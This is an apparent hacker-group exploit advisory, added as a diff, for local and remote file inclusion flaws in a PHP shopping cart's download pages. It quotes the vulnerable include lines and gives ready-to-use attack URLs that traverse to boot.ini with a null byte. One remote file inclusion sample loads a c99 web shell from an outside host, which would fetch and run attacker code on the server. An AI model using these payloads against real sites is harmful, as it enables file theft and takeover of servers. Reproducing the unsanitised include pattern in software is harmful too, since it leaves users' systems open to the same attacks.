@@ -1,0 +1,68 @@
+# Author: Zer0 Thunder
+# Site : http://www.profitcode.net/ - http://profbiz-cart.sourceforge.net/
+# Tested on: Windows XP sp2 [WampServer 2.0i] 
+
+- There are Cople of pages that has the LFI vuln
+Vuln c0de : dl-authcontent.php
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ $returlvar = "dloads";
+    include "$docroot" . "tplates/usrauthlogin.php";
+    exit;
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Exploit :
+http://server/store/dloads/dloadsmainincs/dl-authcontent.php?docroot=[LFI]
+
+Sample : 
+http://server/store/dloads/dloadsmainincs/dl-authcontent.php?docroot=../../../../../boot.ini%00
+
+***************************************************************************************************
+
+vuln c0de : dl-maincatsearch-dlcontent.php
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+include("$docroot" . "shopincs/catpgtop$langFile.php");
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Exploit
+http://server/store/dloads/dloadsmainincs/dl-maincatsearch-dlcontent.php?docroot=[LFI]
+
+Sample
+http://server/store/dloads/dloadsmainincs/dl-maincatsearch-dlcontent.php?docroot=../../../../../boot.ini%00
+
+
+Vuln c0de : dloads-payed.php
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+include "$docroot" . "tplates/usrauthlogin.php";
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Exploit 
+http://server/store/dloads/dloadstplates/dloads-payed.php?docroot=[LFI]
+
+Sample 
+http://server/store/dloads/dloadstplates/dloads-payed.php?docroot=.../../../../../../../../boot.ini%00
+
+
+************************************************************************
+
+- For Some resons this comeup with a RFI 
+
+Vuln c0de :	dloads-header.php
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+include "$docroot" . "dloads/dloadsmainincs/inc-dloadsfunctions.php";
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Exploit 
+http://server/store/dloads/dloads-header.php?docroot=[RFI]
+
+Sample 
+http://server/store/dloads/dloads-header.php?docroot=http://www.cfsm.cn/c99.txt?%00
+
+
+########################################
+# MSN : zer0_thunder@colombohackers.com
+# Email : neonwarlock@live.com
+# Site : LKHackers.com
+# Greetz : To all my friends
+# Note : Proud to be a Sri Lankan
+# Me : Sri Lankan Hacker
+########################################
